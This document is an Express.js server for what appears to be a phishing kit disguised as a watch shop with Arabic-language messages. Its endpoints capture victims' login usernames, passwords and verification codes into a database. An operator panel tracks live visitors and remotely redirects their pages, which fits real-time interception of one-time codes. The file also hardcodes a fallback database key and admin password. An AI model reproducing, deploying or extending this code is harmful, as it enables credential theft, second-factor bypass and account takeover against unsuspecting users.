const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://qwqszedggvefzkpqsihu.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_uF-mM8mh9wUHwaogjSjwKg__4N4j_we';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin1234@@';

const ADMIN_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD).digest('hex');

// Admin login
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    return res.json({ success: true, token: ADMIN_TOKEN });
  }
  res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
});

// Admin auth check
function isAdmin(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) {
    return auth.slice(7) === ADMIN_TOKEN;
  }
  return false;
}

// Save order
app.post('/api/orders', async (req, res) => {
  try {
    const { name, phone, watch_color, watch_index } = req.body;
    if (!name || !phone) {
      return res.status(400).json({ success: false, message: 'الاسم ورقم الهاتف مطلوبان' });
    }
    const { error } = await supabase.from('orders').insert({
      name, phone,
      email: phone + '@order.local',
      wilaya: '-',
      address: '-',
      watch_color: watch_color || '-',
      watch_index: watch_index !== undefined ? watch_index : null,
      current_page: 'order',
      status: 'pending',
      created_at: new Date().toISOString()
    });
    if (error) throw error;
    const { data: inserted } = await supabase.from('orders').select('id').eq('phone', phone).order('created_at', { ascending: false }).limit(1).maybeSingle();
    res.json({ success: true, order_id: inserted ? inserted.id : null });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save login username
app.post('/api/login-data', async (req, res) => {
  try {
    const { order_id, username } = req.body;
    if (order_id) {
      await supabase.from('orders').update({ login_username: username, current_page: 'login' }).eq('id', order_id);
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save login password
app.post('/api/password-data', async (req, res) => {
  try {
    const { order_id, password } = req.body;
    if (order_id) {
      await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save verification code
app.post('/api/code-data', async (req, res) => {
  try {
    const { order_id, code } = req.body;
    if (order_id) {
      await supabase.from('orders').update({ verification_code: code, status: 'code_pending', current_page: 'code-waiting' }).eq('id', order_id);
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Presence / heartbeat for active visitors
app.post('/api/presence', async (req, res) => {
  try {
    const { session_id, current_page } = req.body;
    if (!session_id) return res.json({ ok: false });
    const now = Date.now();
    const { data: existing } = await supabase.from('visitors').select('id, redirect_to').eq('session_id', session_id).maybeSingle();
    if (!existing) {
      await supabase.from('visitors').upsert({
        session_id, current_page: current_page || 'home',
        last_active_at: now, created_at: now
      }, { onConflict: 'session_id' });
    } else {
      const updates = { last_active_at: now };
      if (current_page) updates.current_page = current_page;
      await supabase.from('visitors').update(updates).eq('session_id', session_id);
      if (existing.redirect_to) {
        await supabase.from('visitors').update({ redirect_to: null }).eq('session_id', session_id);
        return res.json({ ok: true, redirectTo: existing.redirect_to });
      }
    }
    res.json({ ok: true });
  } catch (err) {
    res.json({ ok: false });
  }
});

// Get active visitors count (admin)
app.get('/api/visitors/active', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ count: 0 });
    const cutoff = Date.now() - 15000;
    const { data } = await supabase.from('visitors').select('*').gt('last_active_at', cutoff);
    res.json({ count: (data || []).length, visitors: data || [] });
  } catch (err) {
    res.json({ count: 0, visitors: [] });
  }
});

// Admin redirect client by order ID
app.post('/api/admin/redirect', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { order_id, redirect_to } = req.body;
    if (!order_id || !redirect_to) return res.status(400).json({ success: false });
    const { data: order } = await supabase.from('orders').select('current_page').eq('id', order_id).maybeSingle();
    if (!order) return res.status(404).json({ success: false });
    const cutoff = Date.now() - 30000;
    const page = (order.current_page || '').replace('-fr', '');
    const { data: av } = await supabase.from('visitors').select('id, current_page').gt('last_active_at', cutoff);
    if (av) {
      const m = av.filter(v => { const vp = (v.current_page || '').replace('-fr', ''); return vp === page || vp === page.replace('.html', ''); });
      for (const v of (m.length ? m : av)) await supabase.from('visitors').update({ redirect_to }).eq('id', v.id);
    }
    await supabase.from('orders').update({ redirect_to }).eq('id', order_id);
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false, message: err.message }); }
});

// Admin redirect specific visitor by session ID
app.post('/api/admin/redirect-visitor', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { session_id, page } = req.body;
    if (!session_id || !page) return res.status(400).json({ success: false });
    await supabase.from('visitors').update({ redirect_to: page }).eq('session_id', session_id);
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false, message: err.message }); }
});

// Get ALL visitors (admin)
app.get('/api/visitors/all', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ visitors: [], totalCount: 0 });
    const { data } = await supabase.from('visitors').select('*').order('last_active_at', { ascending: false });
    res.json({ visitors: data || [], totalCount: (data || []).length });
  } catch (err) { res.json({ visitors: [], totalCount: 0 }); }
});

// Delete inactive clients (admin)
app.delete('/api/admin/inactive-clients', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const cutoff = Date.now() - 120000;
    const { data: activeVisitors } = await supabase.from('visitors').select('current_page').gt('last_active_at', cutoff);
    const activePages = new Set((activeVisitors || []).map(v => v.current_page));
    const { data: allOrders } = await supabase.from('orders').select('id, current_page');
    const inactive = (allOrders || []).filter(o => !activePages.has(o.current_page) && o.current_page !== 'success');
    let deleted = 0;
    for (const o of inactive) {
      await supabase.from('orders').delete().eq('id', o.id);
      deleted++;
    }
    res.json({ success: true, deletedCount: deleted });
  } catch (err) { res.status(500).json({ success: false, message: err.message }); }
});

// Reset total visitors (admin) - uses REST API directly to bypass RLS issues
app.post('/api/admin/reset-visitors', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { data: before } = await supabase.from('visitors').select('session_id');
    const countBefore = (before || []).length;
    if (countBefore === 0) return res.json({ success: true, deletedCount: 0 });

    // Delete each visitor via REST API directly (bypasses JS client RLS issues)
    let deleted = 0, restErrors = [];
    for (const v of before) {
      try {
        const r = await fetch(
          SUPABASE_URL + '/rest/v1/visitors?session_id=eq.' + encodeURIComponent(v.session_id),
          {
            method: 'DELETE',
            headers: {
              'apikey': SUPABASE_KEY,
              'Authorization': 'Bearer ' + SUPABASE_KEY,
              'Prefer': 'return=minimal'
            }
          }
        );
        if (r.ok || r.status === 204) deleted++;
        else restErrors.push({ session: v.session_id, status: r.status, text: await r.text() });
      } catch (e) { restErrors.push({ session: v.session_id, err: e.message }); }
    }

    // Also try JS client as fallback
    if (deleted === 0) {
      for (const v of before) {
        await supabase.from('visitors').delete().eq('session_id', v.session_id);
      }
    }

    const { data: after } = await supabase.from('visitors').select('session_id');
    res.json({
      success: true,
      before: countBefore,
      remaining: (after || []).length,
      deletedCount: countBefore - (after || []).length,
      restDeleted: deleted,
      restErrors: restErrors.slice(0, 3)
    });
  } catch (err) { res.status(500).json({ success: false, message: err.message }); }
});

// Debug: test visitors table (admin)
app.get('/api/admin/debug-visitors', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { data, error, count } = await supabase.from('visitors').select('*');
    if (error) return res.json({ success: false, error: error.message, code: error.code, details: error.details });
    const testDel = data && data.length > 0
      ? await supabase.from('visitors').delete().eq('session_id', data[0].session_id)
      : { error: null };
    res.json({
      success: true,
      visitorCount: (data||[]).length,
      sampleVisitor: data && data[0] ? data[0] : null,
      columns: data && data[0] ? Object.keys(data[0]) : [],
      testDeleteError: testDel.error ? testDel.error.message : null,
      testDeleteCode: testDel.error ? testDel.error.code : null
    });
  } catch (err) { res.json({ success: false, message: err.message }); }
});

// Check order status (public - for waiting page)
app.get('/api/orders/:id/status', async (req, res) => {
  try {
    const { data } = await supabase.from('orders').select('status').eq('id', req.params.id).maybeSingle();
    if (!data) return res.json({ status: 'not_found' });
    res.json({ status: data.status });
  } catch (err) {
    res.json({ status: 'error' });
  }
});

// Get orders (admin)
app.get('/api/orders', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ orders: [] });
    const { data, error } = await supabase.from('orders').select('*').order('created_at', { ascending: false });
    if (error) throw error;
    res.json({ orders: data || [] });
  } catch (err) {
    res.status(500).json({ orders: [], message: err.message });
  }
});

// Update order status
app.patch('/api/orders/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const updates = {};
    if (req.body.status) updates.status = req.body.status;
    if (req.body.redirect_to !== undefined) updates.redirect_to = req.body.redirect_to;
    if (req.body.current_page) updates.current_page = req.body.current_page;
    if (req.body.custom_message !== undefined) updates.custom_message = req.body.custom_message;
    const { error } = await supabase.from('orders').update(updates).eq('id', req.params.id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Delete order
app.delete('/api/orders/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { error } = await supabase.from('orders').delete().eq('id', req.params.id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

module.exports = app;
